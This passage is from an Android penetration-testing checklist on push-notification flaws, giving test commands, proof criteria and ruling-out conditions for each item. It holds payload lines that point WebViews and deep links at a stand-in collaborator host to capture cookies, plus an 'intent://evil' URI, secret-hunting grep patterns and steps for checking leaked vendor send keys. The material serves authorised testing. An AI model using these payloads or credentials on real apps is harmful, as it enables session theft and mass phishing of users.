  names the sender in the rendering, and the deep link is server-chosen (your `link` field is dropped).

### D24-012 · Sensitive content in the push payload itself — transits the provider and lands in every drawer reader

| | |
|---|---|
| **Severity ceiling** | High for an OTP, approval code or full card/account number; Medium for balances, message bodies and PII |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); `broken_authentication_and_session_management.two_fa_bypass` (P3) when the value is the OTP and a listener or the lock screen reads it |
| **Attacker** | AM-04 (notification listener) / AM-10 (lock screen) — the push provider's own visibility is not an attacker model (D24-006) |
| **Applies to** | Every app whose backend puts values, not pointers, in the payload |
| **Requires** | push, device |
| **Maps to** | MASWE-0037; MASTG-TEST-0315; MASTG-DEMO-0078; rule `mastg-android-sensitive-data-in-notifications`; ATT&CK T1517; D13-048 (the OTP channel set), D20-030, D20-033 |
| **Record** | `logs/D24-012.txt` (payload capture with the value, redacted in the report); `screenshots/D24-012-1.png` (the value in a reader) |

- **Skip when:** `grep -c 'MESSAGING_EVENT\|c2dm\|hms.push' "$DEC/apktool/AndroidManifest.xml"` prints 0 and no vendor push SDK row is in `inventory/push.csv` — write `n/a — D24-012: no push transport (probe 1 = 0)`.
- **Test:** The D24-002 capture shows whether the payload carries the value or an id the app resolves
  with an authenticated fetch. A value in the payload is readable at four points the app does not
  control: the provider, notification history, any granted listener, and the keyguard. Rate on the most
  sensitive value and the weakest reader that sees it.
- **How:**
```bash
grep -E 'otp|code|pin|balance|amount|iban|card|ssn|dob|address|body' "$E/logs/D24-002.txt" | tee "$E/logs/D24-012.txt"
grep -rnE 'getData\(\)\.get\("(otp|code|pin|balance|amount|body|message)"' "$DEC/jadx/sources" | head
adb -s "$SERIAL" shell dumpsys notification --noredact | grep -A12 "pkg=$PKG" | grep -iE 'text=|title=' | tee -a "$E/logs/D24-012.txt"
# readers: lock screen (D20-030), history (D20-033), listener (D20-031 PoC), companion (D24-024)
```
- **Proof:** The value in the captured payload **and** in at least one reader the user did not
  explicitly trust with it (history or listener output, lock-screen screenshot).
- **Escalation:** → D13-048 and D22-047 for the OTP chain; → D20-031 PoC listener; → D24-031 when a
  one-time token for a route rides in the extras.
- **Ruled out when:** Payloads are content-free (an id plus a type) and the posted text is built from an
  authenticated fetch (file:line of the fetch; the `--noredact` dumpsys shows no secret), or the channel
  posts `VISIBILITY_SECRET` with a `setPublicVersion` that carries none of it (D20-030).

### D24-013 · Push payload routed into the deep-link router without the browser path's allow-list

| | |
|---|---|
| **Severity ceiling** | High; Critical when the route reaches the session WebView or an authenticated action |
| **VRT** | rated on the route the push opens — the D09/D10 node of the sink |
| **Attacker** | AM-05 / AM-01 with D24-011; AM-03 with D05-025; AM-09 otherwise |
| **Applies to** | Handlers that pass a payload key (`url`, `deeplink`, `link`, `click_action`, `gcm.n.link`) to the router or to `Intent.parseUri` |
| **Requires** | push, deeplink |
| **Maps to** | MASWE-0029; MASTG-TEST-0394; MASTG-BEST-0071; MASTG-TECH-0173; rule `mastg-android-deeplink-unvalidated-parameter`; D09-039 (notification-origin trust) |
| **Record** | `logs/D24-013.txt` (hook trace of the route taken); `screenshots/D24-013-1.png` |

- **Skip when:** `inventory/deeplinks.csv` is empty and `grep -rlE 'parseUri\(' "$DEC/jadx/sources" | wc -l` = 0 — write `n/a — D24-013: no deep-link router and no parseUri in $DEC`.
- **Test:** Push-origin routes are routinely trusted more than browser-origin ones: the router skips its
  host allow-list, honours a `from_notification` flag or a signature whose key is in the APK (D09-039), or
  accepts `intent:` URIs the browser path rejects. Send the same off-allow-list route by push and by
  `adb shell am start` and diff the behaviour.
- **How:**
```bash
grep -rnE 'parseUri\(|Uri\.parse\(.*(getData|getString)\(|from_notification|fromPush|isPush' "$DEC/jadx/sources" | head -20
frida -D "$SERIAL" -n "$PKG" -l frida/03-deeplink-trace.js -q -t 300 | tee "$E/logs/D24-013.txt" &
# self-send (D24-004 harness or the D24-011 route) a payload whose link is OFF the D09-001 allow-list:
#   --es 'deeplink' 'targetapp://web?url=https://zq7x4mk9.collab.example/'   and   --es 'link' 'intent://evil#Intent;scheme=targetapp;end'
# browser-path control: the same URI via  adb -s "$SERIAL" shell "am start -a 'android.intent.action.VIEW' -d 'targetapp://web?url=https://zq7x4mk9.collab.example/'"
```
- **Proof:** The trace shows the push-delivered route opening (a request to the collab host, the activity
  started) while the identical browser-path URI is refused — the differential is the finding.
- **Escalation:** → D10-004 when the route lands in the session WebView; → D09-039 when the trust is a
  signature with its key in the package; → D24-020 when the tap Intent is built from the same field.
- **Ruled out when:** The push link passes through the same validator as the browser path (file:line) and
  the canary route is refused on both paths with the same log line; or the handler routes only
  server-chosen ids through a fixed route table.

### D24-014 · Push payload URL or HTML loaded into a WebView — the WebView half of D08-026

| | |
|---|---|
| **Severity ceiling** | Critical with a JS bridge or the session cookie; High without |
| **VRT** | inherits the bridge severity (D10-004); `unvalidated_redirects_and_forwards.open_redirect.get_based` (P4) when the WebView carries nothing |
| **Attacker** | AM-05 / AM-01 with D24-011 or D24-017; AM-09 otherwise |
| **Applies to** | Handlers or launcher activities that call `loadUrl` / `loadDataWithBaseURL` with a payload key, and vendor SDKs whose "rich push" opens a WebView |
| **Requires** | push, webview |
| **Maps to** | MASWE-0035; MASWE-0033; MASTG-TEST-0398; MASTG-TEST-0400; D08-026 (the Intent half), D10-004 |
| **Record** | `logs/D24-014.txt` (frida/01 settings + the request at the collab host); `screenshots/D24-014-1.png` |

- **Skip when:** `inventory/webviews.csv` is empty — write `n/a — D24-014: no WebView in the app (inventory/webviews.csv empty)`.
- **Test:** The notification tap or the data handler hands a URL to a WebView. If the WebView carries the
  session (cookies, a bridge, a token-returning interface), a remote sender gets a page of their choice
  inside it. The `html` variant (`loadDataWithBaseURL` with a vendor origin) is worse: the sender's script
  runs on the app's own origin.
- **How:**
```bash
grep -rnE 'loadUrl\(|loadDataWithBaseURL\(|loadData\(' "$DEC/jadx/sources" | grep -vE 'about:blank|javascript:' | head -20
frida -D "$SERIAL" -n "$PKG" -l frida/01-webview-settings.js -q -t 120 | tee "$E/logs/D24-014.txt"
# self-send  --es 'url' 'https://zq7x4mk9.collab.example/d24-014'  then tap; watch the collab host for the app's UA and cookies
```
- **Proof:** A request from the WebView at your host carrying the app's user agent, cookies or a bridge
  call (frida/02-bridge-enum.js), originated by a push you sent.
- **Escalation:** → D10-004 (credential-returning bridge method); → D24-018 for the vendor in-app-message
  variant; → D08-026 when the same key is parsed into an Intent.
- **Ruled out when:** The URL is validated against the WebView host allow-list before load (file:line) and
  the canary host is refused with the same rejection the D10 items show; or the tap opens the system
  browser (`ACTION_VIEW` with no component — show the resolver).

### D24-015 · Rich-push media (big picture, large icon, sound) fetched over cleartext or from an unvalidated host — a zero-click first-party fetch

| | |
|---|---|
| **Severity ceiling** | Medium; Support for the D16 chain |
| **VRT** | rated on the consequence — content spoofing from a network position (AM-06) or the decoder reached without a tap (D16-036) |
| **Attacker** | AM-06 for the swap; AM-01 / AM-05 with D24-011 for the fetch |
| **Applies to** | Handlers or the SDK's notification parser that fetch `image`, `gcm.n.image`, `icon` or `sound` URLs from the payload |
| **Requires** | push, mitm |
| **Maps to** | MASWE-0026; MASTG-TEST-0235; MASTG-TEST-0236; D16-036 (0-click delivery paths); D14-011 (secondary channels) |
| **Record** | `logs/D24-015.txt` (the fetch at the collab host or the proxy line); `screenshots/D24-015-1.png` |

- **Skip when:** `grep -rlE 'gcm\.n\.image|BigPictureStyle|setLargeIcon\(' "$DEC/jadx/sources" | wc -l` = 0 and the D24-002 payload carries no media URL — write `n/a — D24-015: no rich-push media path`.
- **Test:** Two findings share one fetch. (a) The image URL is loaded over `http://` or by a client that
  ignores the network security config → a network attacker swaps the picture under the vendor's icon.
  (b) Any sender who controls the field makes the victim's device fetch and decode an attacker file
  **with no tap** — the delivery clause the native chapter's decoder bugs need.
- **How:**
```bash
grep -rnE 'gcm\.n\.image|BigPictureStyle|setLargeIcon|getImageUrl|setSound\(' "$DEC/jadx/sources" | head
grep -A3 'base-config\|domain-config' "$DEC/apktool/res/xml/network_security_config.xml" 2>/dev/null | grep -c 'cleartextTrafficPermitted="true"'
# self-send  --es 'image' 'https://zq7x4mk9.collab.example/d24-015.png'  — no tap — and watch the collab host
# cleartext control: --es 'image' 'http://zq7x4mk9.collab.example/x.png' with the proxy transparent
```
- **Proof:** The collab host logs a fetch of the image path before any tap (timestamps against the send),
  or the proxy shows the cleartext fetch and the swapped image renders in the drawer.
- **Escalation:** → D16-036 with the exact decoder entry point (the image is decoded in the app's process
  for the drawer); → D24-011 for the sender model.
- **Ruled out when:** The image host is restricted to the vendor's domain before fetch (file:line) and the
  NSC forbids cleartext for every domain (`cleartextTrafficPermitted` absent or false) — the canary host is
  not fetched within the retry window.

### D24-016 · Push-triggered silent sync acts on a payload-supplied object id

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) when the sync writes (mark read, delete, accept) |
| **Attacker** | AM-05 / AM-01 with D24-011; AM-09 otherwise |
| **Applies to** | Data-message handlers that read an id (`conversation_id`, `order_id`, `account_id`, `action`) and call the backend or mutate local state with it |
| **Requires** | push, backend-api |
| **Maps to** | CWE-639; MASWE-0050; D18-034 (the remote-control framing), D15-058 (harvested ids), D23-017 (entitlement refresh) |
| **Record** | `logs/D24-016.txt` (the proxy line issued by the handler with the swapped id); `requests/E-NNN.http` |

- **Skip when:** the D24-002 capture shows notification messages only (no data keys read by the handler; `onMessageReceived` empty or absent) — write `n/a — D24-016: handler reads no payload key (D24-002 key list empty)`.
- **Test:** The handler is a confused deputy with the victim's session: whatever id the payload names,
  the client fetches, marks, deletes or accepts with the victim's token. If the backend scopes by session
  the fetch fails; if it scopes by the id, the victim's client just performed the attacker's IDOR.
- **How:**
```bash
grep -rnE 'getData\(\)\.get\("(id|conversation_id|order_id|action|type|account)' "$DEC/jadx/sources" | head
# self-send (D24-004) with the id of an object belonging to the SECOND account you own and the proxy on:
#   --es 'type' 'message' --es 'conversation_id' '<B conversation id>'
# then read the proxy: did the client call the backend with B's id, and what came back?
```
- **Proof:** The proxy shows the victim's client issuing the call with the swapped id, and the response
  contains B's data or performs the write (body diff against a request with A's own id).
- **Escalation:** The backend half is a D15 IDOR filed with the request pair; the client half here is
  the delivery clause. → D23-017 when the action is an entitlement refresh; → D24-021 when replaying the
  same message repeats a non-idempotent action.
- **Ruled out when:** The handler issues only a generic sync with no payload-derived parameter (show the
  request after a canary message carrying a foreign id), or the backend returns the same empty/403 body for
  B's id as for a random id.

### D24-017 · Third-party push or engagement vendor send credential in the package — calibrated like D18-033

| | |
|---|---|
| **Severity ceiling** | Critical when the credential sends to every user; Low for a client identifier |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` (P5) when it is the app id |
| **Attacker** | AM-01 — anyone with the APK |
| **Applies to** | Apps shipping a non-first-party push or engagement SDK. The first-party provider's legacy server key and service-account JSON are D18-031 / D18-032; the sender-id calibration is D18-033 — this item is the same discipline for every other vendor. |
| **Requires** | push |
| **Maps to** | MASWE-0004; MASTG-TOOL-0125 (apkleaks); CWE-798; D18-033 (the calibration), D01-064 (older builds) |
| **Record** | `logs/D24-017.txt` (the grep, the vendor-doc sentence, the own-device send response); `screenshots/D24-017-1.png` |

- **Skip when:** `inventory/push.csv` lists only the first-party provider (no vendor SDK row) — write `n/a — D24-017: no third-party push or engagement SDK; first-party credentials settled under D18-031/032`.
- **Test:** Every engagement SDK has a client-safe app identifier and a server-only send credential
  (REST key, master secret, account passcode, API token). Shipping the second is the finding; shipping the
  first is by design. The vendor's documentation sentence that says which is which goes into the report
  before the send.
- **How:**
```bash
grep -rnoE '(rest_api_key|REST_API_KEY|master_secret|account_passcode|api_token|server_key|app_secret|private_key)["=: ]+[A-Za-z0-9_\-]{16,}' "$DEC/apktool/res" "$DEC/apktool/assets" "$DEC/jadx/sources" 2>/dev/null | sort -u | tee "$E/logs/D24-017.txt"
# calibrate: is the matched value the vendor's APP ID (client-safe) or its SEND credential? quote the vendor doc line.
# validate with ONE benign send to YOUR OWN device token via the vendor's REST API; never to a segment, tag, topic or "all users"
```
- **Proof:** The vendor API accepts the credential (a dead one is rejected) and a benign push arrives on
  your own device; the vendor's doc quoted as "never embed in client code". Older builds (D01-064) count:
  a rotated credential that still sends is the same finding.
- **Escalation:** → D24-011 (mass phishing under the brand); → D24-013 / D24-014 / D24-016 when the
  handler acts on the payload — the sentence that makes this Critical; → D24-018 when the same credential
  edits in-app-message campaigns.
- **Ruled out when:** Every matched value is a documented client identifier and a send attempt with it is
  rejected (record the 401/403 and the doc line); no server-only credential appears in any build in the
  version history.

### D24-018 · Vendor in-app-message or campaign HTML rendered in a WebView with a JS bridge

| | |
|---|---|
| **Severity ceiling** | High; Critical when the bridge returns a credential |
| **VRT** | inherits the bridge severity (D10-004) |
| **Attacker** | AM-09 (whoever controls the campaign dashboard); AM-01 with D24-017 |
| **Applies to** | Apps with an in-app-messaging or campaign SDK that renders dashboard-authored HTML in a WebView |
| **Requires** | push, webview, js-bridge |
| **Maps to** | MASWE-0033; MASWE-0035; MASTG-TEST-0398; MASTG-BEST-0035; D10-004; D24-017 |
| **Record** | `logs/D24-018.txt` (frida/02 bridge enumeration on the campaign WebView); `screenshots/D24-018-1.png` |

- **Skip when:** `grep -rliE 'inappmessag|InAppMessage|campaign' "$DEC/jadx/sources" | wc -l` = 0 or `inventory/webviews.csv` is empty — write `n/a — D24-018: no in-app-messaging SDK WebView`.
- **Test:** Campaign HTML is authored on a dashboard by marketing staff, delivered through the vendor,
  and rendered inside the app — with JavaScript on and often with the SDK's own bridge plus the app's.
  Whoever can author a campaign (a vendor-side compromise, a leaked dashboard credential, or the REST key
  from D24-017) runs script with those bridges.
- **How:**
```bash
grep -rnE 'addJavascriptInterface\(|setJavaScriptEnabled\(true\)|loadDataWithBaseURL\(' "$DEC/jadx/sources" | grep -iE 'inapp|iam|campaign|message' | head
frida -D "$SERIAL" -n "$PKG" -l frida/02-bridge-enum.js -q -t 120 | tee "$E/logs/D24-018.txt"
# if you hold a dashboard account for the project (ask the operator; blockers), author a campaign whose HTML calls the bridge against your own device only
```
- **Proof:** A bridge method on the campaign WebView callable from authored HTML (the frida/02 listing
  plus one call observed from a test campaign on your own device), or static: `addJavascriptInterface` on
  the IAM WebView with a method that returns a token or performs an action.
- **Escalation:** → D10-004 (credential-returning method); → D24-017 (who can author).
- **Ruled out when:** In-app messages are rendered natively (no WebView in the IAM path — file:line), or
  the IAM WebView has JavaScript disabled and no interface (frida/01 settings dump for that WebView).

### D24-019 · Push-SDK exported receivers, services and activities beyond the first-party receiver

| | |
|---|---|
| **Severity ceiling** | High — rated on the handler's sink |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
| **Attacker** | AM-03 |
| **Applies to** | Vendor SDK components merged into the manifest: notification-opened / dismissed receivers, action-button receivers, "open URL" activities, sync services. The first-party FCM receiver is D05-025. |
| **Requires** | push, exported-receiver, device |
| **Maps to** | MASWE-0018; MASWE-0032; MASTG-TEST-0366; MASTG-DEMO-0130; MASTG-TECH-0162; D05-025, D04-059 |
| **Record** | `logs/D24-019.txt` (`tools/02` sweep output for the SDK rows); `pocs/F-NNN/` (probe-app log on a hit) |

- **Skip when:** `inventory/components.csv` has no exported row whose class is under a push-SDK package — write `n/a — D24-019: no exported push-SDK component (components.csv filtered on the SDK prefixes)`.
- **Test:** SDK manifests ship exported components that re-create the push's effect locally: a
  "notification opened" receiver that takes the deep link as an extra, an activity that opens a URL, a
  service that applies a config. Each one is D24-013/014/016 with AM-03 instead of a remote sender.
- **How:**
```bash
awk -F, 'NR>1 && tolower($0) ~ /onesignal|braze|clevertap|moengage|pushwoosh|airship|firebase|hms/' inventory/components.csv | tee "$E/logs/D24-019.txt"
tools/02-component-sweep.sh "$PKG" --inventory "$E/inventory" --out "$E/logs/d24-019-sweep" --serial "$SERIAL"
# probe app (AM-03): send the SDK's own action with attacker extras, e.g. the notification-opened action carrying --es 'url' / --es 'deeplink' to the collab host
```
- **Proof:** The probe app's log (zero permissions, `requestedPermissions=[]`) plus the effect: the
  route opened, the URL fetched, the config written — never an `am` command alone (R3).
- **Escalation:** → D24-013 / D24-014 / D24-016 for the sink; → D04-059 when the component is the
  trampoline; → D05-025 for the first-party receiver.
- **Ruled out when:** Every SDK component is `exported="false"` or guarded by a signature permission that
  `dumpsys package` shows enforced, and the probe's send produces `SecurityException` (log line).

### D24-020 · Notification tap Intent built from payload-controlled action, component or extras — including the notification-message launcher path

| | |
|---|---|
| **Severity ceiling** | Medium; High when a non-exported activity or an authenticated action is reachable |
| **VRT** | inherits the sink's rating (D08-026 / D08-037) |
| **Attacker** | AM-05 / AM-01 for the sender; AM-04 (listener) for the harvest half (D08-040) |
| **Applies to** | Handlers that build the content `PendingIntent` from `click_action`, `gcm.n.click_action`, `gcm.n.link` or a component name in the payload; and every app where a notification message's data keys become the launcher activity's extras |
| **Requires** | push, device |
| **Maps to** | MASTG-TEST-0381; MASTG-BEST-0063; MASTG-KNOW-0024; MASWE-0032; rule `mastg-android-pendingintent-mutable`; D08-026, D08-037, D08-040, D22-015 |
| **Record** | `logs/D24-020.txt`; `screenshots/D24-020-1.png` |

- **Skip when:** `grep -c 'MESSAGING_EVENT\|c2dm\|hms.push' "$DEC/apktool/AndroidManifest.xml"` prints 0 and no vendor push SDK row is in `inventory/push.csv` — write `n/a — D24-020: no push transport (probe 1 = 0)`.
- **Test:** Two paths. (a) The handler turns a payload string into the tap Intent — an implicit action
  the probe app can claim, or a component name the sender chooses. (b) The provider SDK posts the
  notification itself when the app is backgrounded and, on tap, starts the launcher activity with **every
  data key as an extra**; a launcher that reads `getIntent().getExtras()` for a route, a user id or a
  token is now driven by the sender. Neither path runs `onMessageReceived`, so a handler-only review
  misses both.
- **How:**
```bash
grep -rnE 'setContentIntent\(|PendingIntent\.get(Activity|Broadcast|Service)\(' "$DEC/jadx/sources" | grep -iE 'push|notif|message' | head
grep -rnE 'click_action|gcm\.n\.click_action|gcm\.n\.link' "$DEC/jadx/sources" | head
# launcher path: which extras does the launcher activity read?
L=$(grep -B2 -A12 'android.intent.category.LAUNCHER' "$DEC/apktool/AndroidManifest.xml" | grep -oE 'android:name="[^"]+"' | head -1 | cut -d'"' -f2)
grep -nE 'getIntent\(\)\.(getExtras|getStringExtra|getData)' "$DEC/jadx/sources/${L//.//}.java"
# self-send a NOTIFICATION message (gcm.n.e=1, title, body) with data keys the launcher reads, background the app, tap
```
- **Proof:** The tap starts the probe app's activity (claimed action) or the launcher acts on your extras
  (route opened, id used) — trace with frida/03-deeplink-trace.js and screenshot.
- **Escalation:** → D08-040 when a listener can harvest the mutable `PendingIntent`; → D24-013 for the
  route; → D22-015 / D04-059 when a trampoline is the gadget.
- **Ruled out when:** The content Intent is explicit, built with `FLAG_IMMUTABLE`, and carries only
  server-chosen ids (file:line), and the launcher ignores push-origin extras (a canary notification message
  with foreign keys produces no route or id use in the trace).

### D24-021 · Push replay or duplicate delivery repeats a non-idempotent action

| | |
|---|---|
| **Severity ceiling** | Medium; High when the repeated action moves money or entitlement |
| **VRT** | rated on the replayed action's node (D15 / D23) |
| **Attacker** | AM-01 / AM-05 with a send path (D24-003); AM-09 otherwise |
| **Applies to** | Data-message handlers that perform an action (accept, confirm, pay, apply, mark delivered) without deduplicating on the message id |
| **Requires** | push, backend-api |
| **Maps to** | CWE-294; MASWE-0050; D23-006 (purchase idempotency), D23-017 |
| **Record** | `logs/D24-021.txt` (two proxy lines for one message id); `requests/E-NNN.http` |

- **Skip when:** as D24-016: no payload-driven action in the handler — write `n/a — D24-021: handler performs no action on data messages`.
- **Test:** Providers deliver at-least-once; the handler must dedupe on the message id or the backend must
  be idempotent. Deliver the same message twice (same `google.message_id`) through the D24-004 harness and
  watch whether the action runs twice.
- **How:**
```bash
grep -rnE 'getMessageId\(|collapse_key|getCollapseKey\(' "$DEC/jadx/sources" | head
# D24-004 harness, same --es 'google.message_id' 'd24-021-fixed' twice, 10 s apart, proxy on; count the backend calls
```
- **Proof:** Two backend calls (or two local state changes) for one message id, with the action's
  consequence shown twice.
- **Escalation:** → D23-006 / D23-017 when the action is a purchase or entitlement; the backend
  idempotency half is a D15 finding.
- **Ruled out when:** The handler drops a repeated message id (log line) or the backend answers the second
  call with a no-op / 409 whose body shows nothing changed (diff).

### D24-022 · Push-driven full-screen or call-style notification puts attacker text over the lock screen

| | |
|---|---|
| **Severity ceiling** | High — remote phishing surface over the keyguard; the permission half alone is D22-042 |
| **VRT** | `server_side_injection.content_spoofing.external_authentication_injection` (P4) — argue up with the credential prompt the text leads to and the lock-screen rendering |
| **Attacker** | AM-05 / AM-01 with D24-011 or D24-017; AM-09 otherwise |
| **Applies to** | Push paths that build `setFullScreenIntent`, `CallStyle` or an incoming-call notification from payload fields |
| **Requires** | push, device |
| **Maps to** | MASWE-0037; MASWE-0036; ATT&CK T1660, T1541; D22-042, D22-020, D03-060 (the permission and exemption halves) |
| **Record** | `logs/D24-022.txt`; `screenshots/D24-022-1.png` (the full-screen UI over the keyguard with the canary text) |

- **Skip when:** `grep -rlE 'setFullScreenIntent\(|CallStyle|forIncomingCall\(' "$DEC/jadx/sources" | wc -l` = 0 and the manifest lacks `USE_FULL_SCREEN_INTENT` — write `n/a — D24-022: no full-screen or call-style notification path`.
- **Test:** A full-screen intent or call-style notification is the one drawer surface that takes the whole
  screen while the device is locked. If any payload field reaches its title, body, caller name or avatar,
  a remote sender has a lock-screen phishing page under the vendor's identity; the user's
  `POST_NOTIFICATIONS` choice is irrelevant to the call-style exemption (D22-020).
- **How:**
```bash
grep -rnE 'setFullScreenIntent\(|CallStyle|forIncomingCall\(|USE_FULL_SCREEN_INTENT' "$DEC/jadx/sources" "$DEC/apktool/AndroidManifest.xml" | head
adb -s "$SERIAL" shell appops get "$PKG" USE_FULL_SCREEN_INTENT      # API 34+: allow / deny / default
# self-send (D24-004 harness or the D24-011 route) the payload the full-screen path reads, then lock the screen before delivery:
adb -s "$SERIAL" shell input keyevent KEYCODE_SLEEP
```
- **Proof:** Screenshot of the full-screen UI above the keyguard showing the canary text from the push,
  with the send that produced it in `logs/D24-022.txt`.
- **Escalation:** → D04 credential-prompt redress when the UI has an input; → D24-047 when the surface is
  an approval; → D22-042 for the permission argument when the app is not a calling or alarm app.
- **Ruled out when:** No full-screen or call-style builder exists in the push path (grep 0 with the
  handler read to its sinks), or the text is server-templated end to end (D24-011 ruled out) and the
  app's calling use is genuine — then only the D22-042 permission question remains.

### D24-023 · Live Updates / promoted ongoing notifications carry payload text onto the lock screen and always-on display

| | |
|---|---|
| **Severity ceiling** | Medium when account data sits in the promoted surface; Low for text spoofing |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) for the victim's data on a locked device; `server_side_injection.content_spoofing.text_injection` (P5) for the spoof |
| **Attacker** | AM-10 for the data on the keyguard; AM-05 / AM-01 for the spoof |
| **Applies to** | Apps using Android 16's promoted ongoing notifications (`Notification.ProgressStyle`, `setRequestPromotedOngoing`) for deliveries, rides, orders, timers — verify the API names against the installed platform's reference before citing them |
| **Requires** | push, device, api>=36 |
| **Maps to** | MASWE-0037; MASWE-0036; MASTG-TEST-0315; D20-030 (visibility model), D04-071 (surfaces that bypass `FLAG_SECURE`) |
| **Record** | `logs/D24-023.txt` (dumpsys flags for the promoted entry); `screenshots/D24-023-1.png` (keyguard / AOD) |

- **Skip when:** device API < 36 (`adb -s "$SERIAL" shell getprop ro.build.version.sdk`) or `grep -rlE 'ProgressStyle|setRequestPromotedOngoing' "$DEC/jadx/sources" | wc -l` = 0 — write `n/a — D24-023: no promoted-ongoing notification use (API <36 or grep 0)`.
- **Test:** A promoted ongoing notification is pinned to the status bar, the lock screen and the
  always-on display with a persistent chip and progress text. Content there is visible without unlocking
  and without the per-notification visibility decision the user made for the channel. Two questions: does
  the surface show account data (address, amount, order id, the other party's name), and does a payload
  field feed its text?
- **How:**
```bash
grep -rnE 'ProgressStyle|setRequestPromotedOngoing|FLAG_PROMOTED_ONGOING|canPostPromotedNotifications' "$DEC/jadx/sources" | head
# drive the flow that promotes (an order, a ride), then:
adb -s "$SERIAL" shell dumpsys notification --noredact | grep -B4 -A16 "pkg=$PKG" | grep -iE 'promoted|ProgressStyle|text=|title=' | tee "$E/logs/D24-023.txt"
adb -s "$SERIAL" shell input keyevent KEYCODE_SLEEP   # then photograph the AOD / keyguard; AVD: screencap after lock
```
- **Proof:** The promoted entry's text (dumpsys) and the keyguard screenshot showing it, with the account
  data or the push-supplied canary text in it.
- **Escalation:** → D20-030 for the visibility argument; → D24-011 for the sender model; → D24-022 when
  the same text drives a full-screen surface.
- **Ruled out when:** The app does not request promotion (grep 0 and no `promoted` flag in dumpsys after
  the flow), or the promoted text is server-templated and contains no account identifier (dumpsys text
  shown).

### D24-024 · Notification content bridged to Wear, Auto and desktop companions, and retained there after dismissal

| | |
|---|---|
| **Severity ceiling** | Medium when the bridged content is an OTP or a message body; Low otherwise |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
| **Attacker** | AM-10 / AM-11 — the companion on a desk, a wrist, a car or a shared desktop |
| **Applies to** | Apps that post sensitive channels without `setLocalOnly(true)`; apps with `WearableExtender` / `CarExtender` content |
| **Requires** | push, device |
| **Maps to** | MASWE-0037; MASTG-TEST-0315; D20-033 (history on the handset), D04-071 (widget and lock-screen surfaces), D15-015 (companion endpoints) |
| **Record** | `logs/D24-024.txt` (dumpsys flags: `LOCAL_ONLY` present or absent per channel); `screenshots/D24-024-1.png` (the companion) |

- **Skip when:** no companion can be paired in the lab and every sensitive channel sets `setLocalOnly(true)` (grep shows it on each `notify()` path) — write `n/a — D24-024: sensitive channels local-only (file:line); no companion in lab` and keep the row `blocked` rather than n/a when the first clause is false.
- **Test:** By default a notification is bridged to every paired companion and to phone-mirroring
  desktops, where it is rendered on a surface with its own lock state and its own retention. The handset's
  `VISIBILITY_PRIVATE` does not travel with it. An OTP, a one-time link or a message body on a watch face
  is readable by whoever can see the wrist.
- **How:**
```bash
grep -rnE 'setLocalOnly\(|WearableExtender|CarExtender|setBridgeTag|setDismissalId' "$DEC/jadx/sources" | head
# pair a Wear emulator or a companion you own; trigger the OTP / message flow; then:
adb -s "$SERIAL" shell dumpsys notification --noredact | grep -A14 "pkg=$PKG" | grep -E 'flags=|LOCAL_ONLY|text=' | tee "$E/logs/D24-024.txt"
```
- **Proof:** The sensitive text rendered on the companion (screenshot or the companion's own dumpsys) and
  the `flags=` line showing no `LOCAL_ONLY` on that channel.
- **Escalation:** → D13-048 when it is the OTP; → D24-012 for the content class; → D20-033 for history
  on the handset.
- **Ruled out when:** Sensitive channels set `setLocalOnly(true)` (file:line, `LOCAL_ONLY` in dumpsys)
  and the companion trial shows nothing for that channel.

### D24-025 · `MessagingStyle` persons, `content://` icons and custom `RemoteViews` built from untrusted input — SystemUI and every listener as the reader

| | |
|---|---|
| **Severity ceiling** | Medium when a listener gains a read grant on the app's private URI; Low / P5 for the crash half |
| **VRT** | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5) for the crash; rated on the D07 disclosure when the URI grant lands |
| **Attacker** | AM-05 (a message whose avatar or media field reaches the builder); AM-03 via D05-017 / D24-019; AM-04 for the listener that receives the grant |
| **Applies to** | Notification builders that take an icon, person avatar, image or layout id from a message, push or Intent field |
| **Requires** | device |
| **Maps to** | MASWE-0050; MASWE-0032; CWE-20; D05-017, D20-031 (the listener PoC), D07 domain (the provider the URI points at) |
| **Record** | `logs/D24-025.txt`; `pocs/F-NNN/` when the grant is proved |

- **Test:** The system grants read access on every `content://` URI inside a notification to SystemUI
  **and to the enabled listeners**, so that they can render it. A builder that accepts a sender-chosen
  URI for an avatar or picture therefore hands the app's own provider content (a `content://<pkg>.
  fileprovider/...` path chosen by the sender) to any granted listener. The weaker half: a bad layout id
  or a huge bitmap crashes SystemUI or the app — P5 unless persistent.
- **How:**
```bash
grep -rnE 'MessagingStyle|Person\.Builder|createWithContentUri\(|setLargeIcon\(|RemoteViews\(|setCustomContentView\(' "$DEC/jadx/sources" | head
# feed the sender-controlled field (avatar URL, image URL, sticker id) with  content://$PKG.fileprovider/<path from D07 inventory>  via a message from account B or the D24-004 harness
# then from the D20-031 PoC listener, read sbn.getNotification().extras and open the URI with the listener's ContentResolver
```
- **Proof:** The listener's log reading bytes from the app's private URI that the notification carried,
  with the message or payload that chose the URI; or the reproducible crash with the input (P5 — note it,
  do not file it alone).
- **Escalation:** → D07 for what the provider exposes; → D20-031 for the listener PoC; → D16 if the
  image decode is the sink (D24-015).
- **Ruled out when:** Icons and images come only from the app's own cache or resource ids (file:line),
  and a sender-supplied `content://` value is rejected or re-fetched over HTTPS (trace shows the URI
  never reaches the builder).

### D24-026 · Channel and importance chosen by the payload — the push-driven half of D20-030

| | |
|---|---|
| **Severity ceiling** | Medium; Low when the selectable channels are all private |
| **VRT** | inherits D20-030 (lock-screen visibility and channel override) |
| **Attacker** | AM-05 / AM-01 for the sender; AM-10 for the lock-screen reader |
| **Applies to** | Handlers that honour a payload channel id (`android_channel_id`, `gcm.n.android_channel_id`, a vendor `channel` key) or build the channel from payload importance |
| **Requires** | push, device |
| **Maps to** | MASWE-0037; MASTG-TEST-0315; D20-030 (owner of the visibility model) |
| **Record** | `logs/D24-026.txt` (the channel table from dumpsys and the self-sent message's channel) |

